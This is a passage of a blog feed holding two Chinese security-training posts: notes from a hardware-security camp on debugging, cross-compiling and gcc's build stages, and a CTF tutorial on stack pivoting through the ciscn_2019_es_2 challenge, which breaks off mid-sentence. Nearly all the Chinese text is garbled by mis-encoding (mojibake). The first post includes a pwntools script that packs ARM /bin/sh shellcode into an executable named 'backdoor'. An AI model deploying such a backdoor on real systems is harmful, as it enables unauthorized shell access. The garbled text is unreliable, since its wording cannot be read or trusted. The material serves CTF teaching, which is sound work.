title="åŠ¨æ€è°ƒè¯•"></a>åŠ¨æ€è°ƒè¯•</h3><p>è½¯ä»¶è¢«è¿è¡Œåœ¨è°ƒè¯•åº•åº§ï¼Œä¹Ÿå°±æ˜¯gdbserverå¹¶åœ¨ä¸Šé¢æš´éœ²å‡ºè°ƒè¯•æ¥å£ç»™è°ƒè¯•å™¨ï¼Œä¹Ÿå°±æ˜¯gdbï¼Œæˆ‘ä»¬é€šè¿‡gdbå‘é€ä¸€äº›è°ƒè¯•å‘½ä»¤å¯¹è½¯ä»¶è¿›è¡Œè°ƒè¯•</p><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/2-1633412024242.png" class=""><p>æ—¢ç„¶è¦è¿›è¡Œè°ƒè¯•ï¼Œé‚£å¿…ç„¶è¦æš´éœ²æ¥å£å‡ºæ¥æˆ‘ä»¬æ‰å¯ä»¥è¿›è¡Œè°ƒè¯•ï¼Œè€Œè¿™ä¸ªæ¥å£ä¹Ÿæœ‰å¾ˆå¤šç§ï¼ŒUARTï¼ŒJTAGï¼ˆJoint Test Action Groupï¼ˆè”åˆæµ‹è¯•è¡Œä¸ºç»„ç»‡ï¼ŒCoresightç­‰ç­‰</p><h2 id="Day3"><a href="#Day3" class="headerlink" title="Day3"></a>Day3</h2><h3 id="äº¤å‰ç¼–è¯‘"><a href="#äº¤å‰ç¼–è¯‘" class="headerlink" title="äº¤å‰ç¼–è¯‘"></a>äº¤å‰ç¼–è¯‘</h3><p>äº¤å‰ç¼–è¯‘ä½•ä¸ºâ€äº¤å‰â€ï¼Ÿäº¤å‰å°±æŒ‡çš„æ˜¯ä¸åŒçš„å¹³å°ï¼Œå°±æ¯”å¦‚è¯´æˆ‘åœ¨<code>X86-64</code>å¹³å°ä¸‹ç¼–è¯‘ä¸€ä¸ª<code>ARM</code>æ¶æ„çš„ç¨‹åºï¼Œå°±ç§°ä¹‹ä¸ºäº¤å‰ç¼–è¯‘ï¼Œä¸æ­¤å¯¹åº”çš„å°±æ˜¯æœ¬åœ°ç¼–è¯‘ï¼Œå¯æ˜¯ä¸ºå•¥ä¼šæœ‰äº¤å‰ç¼–è¯‘è¿™ä¸ªæ¦‚å¿µå‘¢ï¼Ÿä½ æœ¬åœ°ç¼–è¯‘ä¸è¡Œå—ï¼Ÿæˆ‘è¿˜è¦å†å…¶ä»–å¹³å°ä¸Šç¼–è¯‘ï¼Œç„¶åå†é€åˆ°ä½ çš„å¹³å°ä¸Šï¼Œè´¹è¿™ä¹ˆå¤§åŠ²å¹²å˜›ï¼Ÿç¡®å®ä¸è¡Œï¼Œç”±äºåµŒå…¥å¼ç³»ç»Ÿæœ¬èº«çš„åŸå› ï¼Œå®ƒæ‰€æ‹¥æœ‰çš„èµ„æºæå…¶æœ‰é™ï¼Œå®ƒè‡ªå·±è¿è¡Œç¨‹åºéƒ½å¤Ÿå‘›äº†ï¼Œè¿˜ç»™ä½ ç¼–è¯‘ï¼Œæ˜¾ç„¶ä¸å¤ªç°å®ï¼Œæ‰€ä»¥æ‰æœ‰äº†äº¤å‰ç¼–è¯‘</p><p>æˆ‘ä»¬è¿›è¡Œäº¤å‰ç¼–è¯‘çš„æ—¶å€™ä¼šç”¨ä¸€ä¸ªå«<code>arm-linux-gnueabi-gcc</code>ï¼Œè¿™åŒ…å«äº†å››ä¸ªéƒ¨åˆ†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">arch [-vendor] [-kernel] [-system] [-language]</span><br><span class="line"></span><br><span class="line">-arch <span class="comment">#æ¶æ„ï¼Œç¼–è¯‘å‡ºæ¥æ˜¯ç”¨äºé‚£ä¸ªå¹³å°</span></span><br><span class="line">-vendor <span class="comment">#å·¥å…·é“¾çš„æä¾›å‚å•†ï¼Œç”±å‚å•†å®šä¹‰</span></span><br><span class="line">-kernel <span class="comment">#ç›®æ ‡çš„æ“ä½œç³»ç»Ÿ</span></span><br><span class="line">-system <span class="comment">#æ‰€ç”¨çš„åº“å‡½æ•°,å…¶ä¸­gnuç­‰ä»·äºglibc+oabi,gnueabiç­‰ä»·äºglibc+eabi</span></span><br><span class="line">-language <span class="comment">#ç¼–è¯‘è¯­è¨€ï¼Œå¯ä»¥æ˜¯gccå’Œg++</span></span><br></pre></td></tr></table></figure><p> çœ‹ä¼¼è¿™ä¸€ä¸ªå¾ˆé«˜çº§çš„å‘½ä»¤å°±å¯ä»¥ç¼–è¯‘å‡ºæ¥ç¨‹åºï¼Œä½†æ˜¯å…¶æœ¬è´¨è¿˜æ˜¯gccçš„é‚£ä¸€å¥—ï¼ŒæŸä¸ªç¼–è¯‘çš„å‚æ•°ä¸åŒ</p><p>è€Œ<code>gcc</code>æœ¬è´¨æ˜¯ä¸€ä¸ªå·¥å…·åŒ…ï¼Œä½†æ˜¯è¿™ä¸ªå·¥å…·åŒ…ä¸åªæ˜¯å•çº¯çš„æ˜¯ä¸€ä¸ªä¸ªåˆ†æ•£çš„å·¥å…·ï¼Œå®ƒé‡Œé¢çš„å·¥å…·ä¸å·¥å…·ä¹‹é—´ä¼šå½¢æˆä¸€ä¸ªè”ç³»ï¼Œä¹Ÿå°±æ˜¯åé¢ä»‹ç»çš„å·¥å…·é“¾ï¼Œ<code>gcc</code>å°±åƒä¸€ä¸ªè€å¤§ï¼Œæœ‰å¾ˆå¤šå°å¼Ÿå¸®ä»–åšäº‹æƒ…ï¼Œåœ¨å¹³æ—¶ç¼–è¯‘ç¨‹åºçš„æ—¶å€™æˆ‘ä»¬åªéœ€è¦<code>gcc -o xxx xxx.c</code>ï¼Œå°±å®Œæˆäº†ç¼–è¯‘ï¼Œçœ‹ä¼¼ç®€å•çš„èƒŒåï¼Œ<code>gcc</code>æ›¿æˆ‘ä»¬åšçš„äº‹æƒ…å´ä¸ç®€å•ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹<code>gcc</code>ç¼–è¯‘ç¨‹åºçš„æµç¨‹</p><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/1-1633412058794.png" class=""><p>ç¼–è¯‘çš„é˜¶æ®µä¸€å…±åˆ†ä¸ºå››ä¸ªé˜¶æ®µï¼š</p><ul><li>é¢„å¤„ç†ï¼ˆPreprocessï¼‰</li><li>ç¼–è¯‘ï¼ˆCompileï¼‰</li><li>æ±‡ç¼–ï¼ˆAssembleï¼‰</li><li>é“¾æ¥ï¼ˆLinkï¼‰</li></ul><p>ä¸€ä¸ªé˜¶æ®µä¸€ä¸ªé˜¶æ®µæ¥çœ‹</p><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/2-1633412080757.png" class=""><h4 id="é¢„å¤„ç†"><a href="#é¢„å¤„ç†" class="headerlink" title="é¢„å¤„ç†"></a>é¢„å¤„ç†</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">âœ gcc -E hello.c -o hello.i</span><br></pre></td></tr></table></figure><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/8-1633412103083.jpg" class=""><p>ç»è¿‡é¢„å¤„ç†ä¹‹åï¼Œæˆ‘ä»¬æ‰“å¼€æ–‡ä»¶ä¹‹åçœ‹åˆ°ä¸€äº›å®å®šä¹‰è¿˜æœ‰å‡½æ•°çš„å®šä¹‰ï¼Œè¿™æ—¶æˆ‘ä»¬çš„æ–‡ä»¶å¤§å°ä¹Ÿå˜çš„ç‰¹åˆ«å¤§ï¼Œå°±æ˜¯å› ä¸ºé¢„å¤„ç†æŠŠ<code>include</code>çš„åŒ…å…¨éƒ¨è§£æè¿›æ¥äº†</p><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/4-1633412119601.png" class=""><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/3-1633412125461.png" class=""><h4 id="ç¼–è¯‘"><a href="#ç¼–è¯‘" class="headerlink" title="ç¼–è¯‘"></a>ç¼–è¯‘</h4><p>æ¥ä¸‹æ¥å°±æ˜¯ç¼–è¯‘ï¼Œç¼–è¯‘å°±æ˜¯å°†å®ƒè½¬åŒ–æˆæ±‡ç¼–ä»£ç å¹¶è¿›è¡Œä¼˜åŒ–</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">âœ gcc -S hello.i -o hello.s</span><br></pre></td></tr></table></figure><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/5-1633412136616.png" class=""><h4 id="æ±‡ç¼–"><a href="#æ±‡ç¼–" class="headerlink" title="æ±‡ç¼–"></a>æ±‡ç¼–</h4><p>æ±‡ç¼–å™¨å‡ ä¹æ˜¯å¯¹ç€è¯­å¥ä¸€å¥ä¸€å¥çš„è¿›è¡Œè½¬æ¢ï¼Œåˆ°è¿™ä¸€æ­¥ï¼Œæˆ‘ä»¬çš„ä»£ç å°±å·²ç»å½¢æˆäº†<code>ELF</code>æ–‡ä»¶çš„é›å½¢ï¼Œåœ¨æ±‡ç¼–å®Œæˆä¹‹åï¼Œè¿™å·²ç»æ˜¯ä¸€ä¸ª<code>ELF</code>ï¼Œä½†æ˜¯æ‹¿å»è¿è¡Œçš„æ—¶å€™å¹¶ä¸èƒ½è·‘èµ·æ¥ï¼Œä»æµç¨‹æ¥çœ‹å°±æ˜¯å°‘äº†é“¾æ¥è¿™ä¸ªæ­¥éª¤ï¼Œä½†è¿™ä¸ªæ­¥éª¤åˆ°åº•å®Œæˆäº†ä»€ä¹ˆå‘¢ï¼Ÿä¸ºä»€ä¹ˆæ²¡æœ‰å®ƒå°±ä¸è¡Œå‘¢ï¼Ÿæ¥ä¸‹æ¥æ…¢æ…¢ä»‹ç»ï¼</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">âœ gcc -c hello.s -o hello.o</span><br></pre></td></tr></table></figure><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/6-1633412155310.png" class=""><h4 id="é“¾æ¥"><a href="#é“¾æ¥" class="headerlink" title="é“¾æ¥"></a>é“¾æ¥</h4><p>é“¾æ¥å®Œæˆåå°±æˆä¸ºäº†ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œé‚£ä¸ºä»€ä¹ˆè¦é“¾æ¥ï¼Œç¨‹åºå‘˜æ—©æœŸçš„ä»£ç éƒ½æ˜¯å†™åœ¨ä¸€ä¸ªæ–‡ä»¶å½“ä¸­çš„ï¼Œä½†éšç€æ—¶é—´çš„è¿ç§»å‘ç°è¿™æ ·ç¼–å†™ä»£ç å¹¶ä¸åˆ©äºç¨‹åºå‘˜ç®¡ç†ä»£ç ï¼Œå°±æ¼”å˜å‡ºäº†å„ç§æ–‡ä»¶æ¥å†™ä¸åŒçš„ä»£ç ï¼Œæ‰€ä»¥å½“ä¸€ä¸ªç¨‹åºä¸­éœ€è¦ç”¨åˆ°å…¶ä»–ç¨‹åºä¸­çš„å‡½æ•°çš„æ—¶å€™ï¼Œé“¾æ¥å°±å‘æŒ¥äº†å®ƒçš„ä½œç”¨ï¼Œå®ƒå°†æ­¤ç¨‹åºè¦ç”¨åˆ°çš„å‡½æ•°è¿›è¡Œé‡å®šä½ï¼Œä¹Ÿå°±æ˜¯åšä¸€ä¸ªé“¾æ¥ï¼Œè®©å®ƒèƒ½å¤Ÿé¡ºåˆ©çš„è°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼Œè¿™å°±æ˜¯é“¾æ¥ï¼ï¼Œæ‰“ä¸ªæ¯”æ–¹å°±æ˜¯å†<code>hello</code>è¿™ä¸ªç¨‹åºå½“ä¸­ï¼Œæœ‰ä¸¤ä¸ªç¬¦å·ï¼Œä¸€ä¸ªæ˜¯<code>main</code>ï¼Œä¸€ä¸ªæ˜¯<code>hello</code>ï¼Œ<code>main</code>å‡½æ•°å¾ˆæ˜æ˜¾æˆ‘ä»¬ç›´æ¥å®šä¹‰äº†ï¼Œä½†æ˜¯<code>printf</code>å‘¢ï¼Ÿå¾ˆæ˜¾ç„¶æˆ‘ä»¬å¹¶æ²¡æœ‰å†™å®ƒçš„å®ç°ä»£ç ï¼Œå¯¹å§ï¼å¯æ˜¯ä¸ºä»€ä¹ˆæˆ‘èƒ½å¤Ÿè°ƒç”¨å®ƒæ¥æ‰“å°<code>hello</code>å‘¢ï¼Ÿç­”æ¡ˆå‰é¢å·²ç»è®²è¿‡äº†ï¼Œå‰äººå·²ç»å¸®æˆ‘ä»¬å†™å¥½äº†<code>printf</code>çš„å®ç°ä»£ç ï¼Œåªéœ€è¦é€šè¿‡é“¾æ¥å°†ç¨‹åºå½“ä¸­çš„<code>printf</code>çš„åœ°å€æŒ‡å‘åŠ¨æ€é“¾æ¥åº“çš„åœ°å€å°±èƒ½å¤Ÿè°ƒç”¨äº†ï¼</p><blockquote><p>åœ¨æ‹¼æ¥ï¼ˆé“¾æ¥ï¼‰æ‰€æœ‰ç›®æ ‡æ–‡ä»¶çš„åŒæ—¶ï¼Œç¼–è¯‘å™¨ä¼šç¡®å®šå„ä¸ªå‡½æ•°åŠ è½½åˆ°å†…å­˜ä¸­çš„è¿è¡Œåœ°å€ï¼Œç„¶å åè¿‡æ¥ä¿®æ”¹æ‰€æœ‰è°ƒç”¨è¯¥å‡½æ•°çš„æœºå™¨æŒ‡ä»¤ï¼Œä½¿å¾—è¯¥æŒ‡ä»¤èƒ½è·³è½¬åˆ°æ­£ç¡®çš„å†…å­˜åœ°å€ã€‚è¿™ä¸ªè¿‡ç¨‹ å°±æ˜¯é‡å®šä½</p></blockquote><p>æ€»ä¹‹ï¼Œç”¨é€šä¿—ä¸€ç‚¹çš„è¯´å°±æ˜¯æŠŠå¤šä¸ªæ–‡ä»¶ç»™å®ƒç»‘åˆ°ä¸€èµ·ï¼Œå°±å«é“¾æ¥ï¼</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">âœ gcc hello.o -o hello</span><br></pre></td></tr></table></figure><p>çœ‹å®Œç¼–è¯‘çš„è¿‡ç¨‹ï¼Œæˆ‘ä»¬å›å¤´çœ‹çœ‹æ¯ä¸ªè¿‡ç¨‹çš„ç”±é‚£äº›ç¨‹åºæ¥å®Œæˆçš„ï¼Œå‰ä¸¤ä¸ªæ­¥éª¤ï¼Œä¹Ÿå°±æ˜¯é¢„å¤„ç†å’Œç¼–è¯‘æ˜¯ç”±<code>GNU GCC</code>æ¥å®Œæˆçš„ï¼Œåé¢ä¸¤ä¸ªæ±‡ç¼–å’Œé“¾æ¥æ˜¯ç”±<code>GUN Binutils</code>æ¥å®Œæˆçš„ï¼Œ<code>Binutils</code>æ˜¯ä¸ªå•¥ï¼Ÿå®ƒæœ‰ä¸¤ä¸ªç¨‹åºç»„æˆï¼Œä¸€ä¸ªæ˜¯æ±‡ç¼–ï¼ˆasï¼‰ï¼Œä¸€ä¸ªæ˜¯é“¾æ¥ï¼ˆldï¼‰ï¼Œå‰é¢æˆ‘ä»¬ä¹Ÿçœ‹åˆ°äº†é¢„å¤„ç†âœç¼–è¯‘âœæ±‡ç¼–âœé“¾æ¥ï¼Œæ¯ä¸ªè¿‡ç¨‹éƒ½æ˜¯ä¸€ç¯æ¥ä¸€ç¯çš„ï¼Œæ‰€ä»¥æ‰æœ‰äº†ç¼–è¯‘å·¥å…·é“¾çš„æ¦‚å¿µ</p><p>è®²åˆ°è¿™å°±æœ‰ä¸ªç–‘é—®äº†ï¼Œ<code>Binutils</code>æ˜¯ä¸ªå•¥ï¼Ÿ</p><p><code>Binutils</code>çš„å…¨ç§°æ˜¯<code>GNU Binary Utilities</code>ï¼Œ<code>GNU</code>äºŒè¿›åˆ¶å·¥å…·é›†åˆï¼Œæ‰€è°“äºŒè¿›åˆ¶å°±æ˜¯ä¸€äº›0å’Œ1çš„æ•°å­—ï¼Œå›å¿†ä¸Šé¢çš„è¿‡ç¨‹ï¼Œæƒ³åˆ°æ±‡ç¼–è¿‡åæ˜¯ä¸æ˜¯æ•´ä¸ªç¨‹åºå°±å®Œå…¨å˜äº†æ ·ï¼Œç”¨ç¼–è¾‘å™¨æ‰“å¼€éƒ½æ˜¯ä¸€äº›åå…­è¿›åˆ¶çš„æ•°å­—ï¼Œæ‰€ä»¥<code>Binutils</code>å°±æ˜¯å¯¹äºŒè¿›åˆ¶çš„ç›®æ ‡è¿›è¡Œæ“æ§çš„ä¸€ä¸ªå·¥å…·é›†åˆ</p><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/7-1633412170352.png" class=""><p>åœ¨ä¸Šé¢æˆ‘ä»¬çŸ¥é“<code>Binutils</code>ä¸»è¦æœ‰ä¸¤ä¸ªç‰¹åˆ«é‡è¦çš„å·¥å…·ï¼š</p><ul><li><p><code>as</code></p><p>æ±‡ç¼–å™¨ï¼ŒæŠŠæ±‡ç¼–ä»£ç è½¬æ¢æˆç›¸å¯¹äºçš„æœºå™¨ç </p></li><li><p><code>ld</code></p><p>é“¾æ¥å™¨ï¼Œå°†ç›®æ ‡æ–‡ä»¶è¿›è¡Œé“¾æ¥ï¼Œå½¢æˆä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶</p></li></ul><p><code>Binutils</code>è¿˜æœ‰å…¶ä»–æ¬¡è¦çš„å·¥å…·ï¼Œä½†ä½ ä¸€å®šç”¨è¿‡çš„å·¥å…·</p><ul><li><p><code>readelf</code></p></li><li><p><code>objdump</code></p></li><li><p><code>strings</code></p></li><li><p><code>strip</code></p><p>çœ‹å®Œ<code>gcc</code>çš„ç¼–è¯‘è¿‡ç¨‹ï¼Œä½œä¸ºä¸€ä½æ”»å‡»è€…ï¼Œå¾ˆå¤šæ—¶å€™æˆ‘ä»¬ç¼–è¯‘çš„éƒ½ä¸æ˜¯ä¸€ä¸ªåµŒå…¥å¼çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œè€Œæ˜¯<code>shellcode</code>ï¼Œæ‰€ä»¥é™¤äº†ç”¨<code>arm-linux-gnueabi-gcc</code>ä¹‹ç±»çš„äº¤å‰ç¼–è¯‘å·¥å…·æ¥ç¼–è¯‘ä¸€ä¸ªç¨‹åºï¼Œè¿˜å¯ä»¥ä½¿ç”¨<code>pwntools</code>çš„<code>make_elf</code>æ¥ç”Ÿæˆä¸€ä¸ª<code>shellcode</code>åé—¨</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;arm&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;\x01\x60\x8f\xe2\x16\xff\x2f\xe1\x78\x46\x0a\x30\x01\x90\x01\xa9\x92\x1a\x0b\x27\x01\xdf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x00\x00&quot;</span></span><br><span class="line"></span><br><span class="line">backdoor  = make_elf(shellcode)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;backdoor&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">f.write(backdoor)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>è¿è¡Œä¸Šé¢çš„ä»£ç å°±å¾—åˆ°äº†ä¸€ä¸ªåé—¨æ–‡ä»¶ï¼š</p><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/9-1633412183821.png" class="">]]></content>
      
      
      
        <tags>
            
            <tag> CTFåŸ¹è®­ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ ˆè¿ç§»</title>
      <link href="/2021/10/05/%E6%A0%88%E8%BF%81%E7%A7%BB/"/>
      <url>/2021/10/05/%E6%A0%88%E8%BF%81%E7%A7%BB/</url>
      
        <content type="html"><![CDATA[<h4 id="0x00åŸç†"><a href="#0x00åŸç†" class="headerlink" title="0x00åŸç†"></a>0x00åŸç†</h4><p>å½“æº¢å‡ºçš„é•¿åº¦å¤ªå°æ—¶ï¼Œå¯ä»¥é€šè¿‡<code>leave_ret_gadget</code>æ¥å°†<code>ebp</code>å’Œ<code>esp</code>è¿ç§»åˆ°æˆ‘ä»¬æƒ³è¦çš„ä½ç½®ï¼Œæ¯”å¦‚ï¼šä¸€ä¸ªå’±å·²ç»å¸ƒç½®å¥½<code>ROP</code>é“¾çš„åœ°æ–¹</p><p>å‡è®¾åœ¨æ ˆä¸Šå¸ƒç½®å¦‚ä¸‹çš„<code>ROP</code>é“¾ï¼Œæˆ‘å°†é€šè¿‡å›¾ç‰‡æ¥å±•ç¤ºæ”»å‡»æ•ˆæœ</p><img src="/2021/10/05/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20211005131830383.png" class=""><p>å¸ƒç½®å¥½ä¹‹åï¼Œæ¯ä¸ªç¨‹åºå°±è¿”å›å‰éƒ½ä¼šæ¢å¤æ ˆï¼Œå°±å¦‚ä¸‹å›¾çš„ç¨‹åºï¼Œæ‰€ä»¥æˆ‘ä»¬å°±ç­‰å¾…ç¨‹åº<code>leave ret</code>:</p><img src="/2021/10/05/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20211005131920731.png" class=""><p><code>leave</code>å°±æ˜¯ç­‰ä»·äºä¸Šé¢è¯´åˆ°çš„é‚£æ®µæ±‡ç¼–ä»£ç ï¼Œé¦–å…ˆæ‰§è¡Œçš„æ˜¯<code>mov esp,ebp</code>ï¼Œè¿™ä¼šè®©å›¾ä¸­çš„0x108æ”¾å…¥åˆ°<code>esp</code>ä¸­ï¼Œæˆ‘ä»¬çš„æ ˆå°±ä¼šå‘ç”Ÿå¦‚ä¸‹å˜åŒ–ï¼š</p><img src="/2021/10/05/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20211005131951134.png" class="" title="image-20211005131951134"><p>æ¥ç€å°±æ˜¯<code>pop ebp</code>ï¼Œè¯¶~ï¼Œè¿™æ—¶å€™æˆ‘ä»¬çš„<code>ebp</code>å°±å˜æˆäº†æˆ‘ä»¬æƒ³è¦è¿ç§»çš„ä½ç½®äº†:</p><img src="/2021/10/05/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20211005132014543.png" class=""><p>æˆ‘ä»¬åœ¨å›é¡¾ä¸€ä¸‹æ ˆä¸Šçš„æƒ…å†µï¼Œå› ä¸ºåˆšåˆš<code>pop ebp</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„<code>esp</code>æŒ‡å‘äº†<code>leave_ret</code>è¿™ä¸ª<code>gadget</code>ï¼š</p><img src="/2021/10/05/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20211005132035570.png" class=""><p>æ‰€ä»¥ç¨‹åºåˆæ‰§è¡Œäº†ä¸€æ¬¡<code>leave</code>ï¼Œæˆ‘ä»¬è¿ç§»åçš„æ ˆå°±ä¼šå˜æˆè¿™æ ·ï¼š</p><img src="/2021/10/05/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20211005132117043.png" class=""><p>éå¸¸çš„ç¥å¥‡å¼ï¼æˆ‘ä»¬çš„<code>esp</code>æŒ‡å‘äº†<code>system</code>å‡½æ•°ï¼ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å·²ç»æˆåŠŸçš„è·å–äº†<code>shell</code>ï¼ï¼ï¼</p><blockquote><p>å¯èƒ½æœ‰è¯»è€…è¦é—®äº†ï¼šå•Šï¼Ÿï¼Œä½ è¿™<code>ebp</code>ä¸æ˜¯æ ˆåº•å¯„å­˜å™¨å—ï¼Ÿä»–æ€ä¹ˆæŒ‡å‘äº†ä¸€ä¸ªå¥‡æ€ªçš„åœ°æ–¹ï¼Œä½ è¿™ä¸è¡Œå•Šï¼Ÿï¼Œå¯¹ï¼Œæ­¤æ—¶çš„<code>ebp</code>å·²ç»æŒ‡å‘äº†ä¸€ä¸ªå¥‡æ€ªï¼ˆåé¢çš„ä¾‹é¢˜ä¼šå±•ç¤ºå¥‡æ€ªçš„ç‚¹ï¼‰çš„åœ°æ–¹ï¼Œä½†æ˜¯é—®é¢˜ä¸å¤§ï¼Œæˆ‘ä»¬åªè¦æ˜ç™½<code>ebp</code>å’Œ<code>esp</code>æœ€æ ¹æœ¬çš„ä½œç”¨æ˜¯ä»€ä¹ˆå°±ä¸ä¼šè§‰å¾—å¥‡æ€ªäº†ï¼Œ<code>ebp</code>çš„ä½œç”¨æ˜¯æ¥å®šä½æ¯ä¸ªå‡½æ•°çš„æ ˆçš„å¤§å°ï¼Œå½“å‡½æ•°è¿”å›æ—¶æ‰éœ€è¦é€šè¿‡<code>ebp</code>æ¥æ¢å¤ä¸»å‡½æ•°çš„æ ˆï¼Œè€Œ<code>esp</code>æ‰æ˜¯çœŸæ­£æ§åˆ¶æ ˆçš„è¿›å‡ºï¼Œæ‰€ä»¥æˆ‘ä»¬åªè¦æ§åˆ¶<code>esp</code>æŒ‡å‘æˆ‘ä»¬æƒ³è¦æŒ‡å‘çš„å‡½æ•°å°±å¯ä»¥è¾¾åˆ°æˆ‘ä»¬çš„ç›®çš„äº†ï¼Œè‡³äº<code>ebp</code>å˜›ï¼Œæˆ‘ä»¬éƒ½æ‹¿åˆ°<code>shell</code>äº†ï¼Œå®ƒèƒ½ä¸èƒ½æˆåŠŸçš„è¿”å›å·²ç»ä¸å…³æˆ‘äº‹äº†å˜¿å˜¿å˜¿~</p></blockquote><h4 id="0x01-ä¾‹é¢˜è§£æ"><a href="#0x01-ä¾‹é¢˜è§£æ" class="headerlink" title="0x01 ä¾‹é¢˜è§£æ"></a>0x01 ä¾‹é¢˜è§£æ</h4><p>è¿™é‡Œæ‹¿19å¹´å›½èµ›çš„ä¸€é“é¢˜(<code>ciscn_2019_es_2</code>)æ¥è®²è§£ä¸€ä¸‹ï¼Œç»å…¸å…¥é—¨é¢˜ï¼Œåœ¨<code>buu</code>ä¸Šï¼Œå¤§ä¼™å¯ä»¥å»ç©ç©</p><p>ä¹ æƒ¯<code>checksec</code>ä¸€ä¸‹ï¼š</p><img src="/2021/10/05/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20211005132145614.png" class=""><p><code>main</code>å‡½æ•°çœ‹çœ‹ï¼š</p><img src="/2021/10/05/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20211005132203888.png" class=""><p><code>vul</code>å‡½æ•°ä¸ç”¨å¤šè¯´ï¼Œè‚¯å®šå°±æ˜¯å—å®³å‡½æ•°äº†ï¼Œä»”ç»†ä¸€çœ‹ï¼Œåªèƒ½æº¢å‡º8å­—èŠ‚å¼ï¼ä¹ŸçœŸå¤ŸæŠ çš„ï¼Œä¸è¿‡æˆ‘ä»¬åˆšåˆšå­¦äº†æ ˆè¿ç§»ï¼Œä¸æ…Œ</p><img src="/2021/10/05/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20211005132222944.png" class=""><p>æˆ‘ä»¬ä¸€ä¸ªä¸ªæ¥çœ‹å¼ï¼Œé¦–å…ˆç¨‹åº<code>memset</code>äº†<code>s</code>è¿™ä¸ªæ•°ç»„ï¼Œä½†æ˜¯å¾ˆå¥‡æ€ªï¼Œå®ƒåˆå§‹åŒ–åˆä¸å…¨éƒ¨æ¸…é›¶ï¼Œå°±æ•´äº†0x20ä¸ªå­—èŠ‚ï¼Œå®ƒä¸ºå•¥è¦è¿™ä¹ˆåšå‘¢ï¼Œå…¶å®å°±æ˜¯åœ¨æ³„éœ²ä¿¡æ¯ï¼Œå¦‚æœå®ƒæ²¡å…¨éƒ¨æ¸…é›¶ï¼Œé‚£å0x10æ˜¯ä»€ä¹ˆä¸œè¥¿å‘¢ï¼Ÿè¯¶~ï¼Œå°±æ˜¯æ ˆä¸Šçš„åœ°å€å¯¹å§ï¼Œæ‰€ä»¥å½“æˆ‘ä»¬è¦†ç›–äº†<code>s</code>æ•°ç»„æœ€åçš„<code>&quot;\n&quot;</code>ï¼Œé‚£<code>printf</code>æ‰“å°sçš„æ—¶å€™ï¼Œæ˜¯ä¸æ˜¯å°±ä¸ä¼šæˆªæ–­ï¼Œæ˜¯ä¸æ˜¯å°±æ‰“å°äº†é‚£æœªåˆå§‹åŒ–çš„å€¼ï¼Œä¹Ÿå°±æ³„éœ²äº†æ ˆä¸Šçš„åœ°å€ï¼Œæœ‰äººå¯èƒ½åˆæœ‰ç–‘é—®äº†ï¼Œæ³„éœ²æ 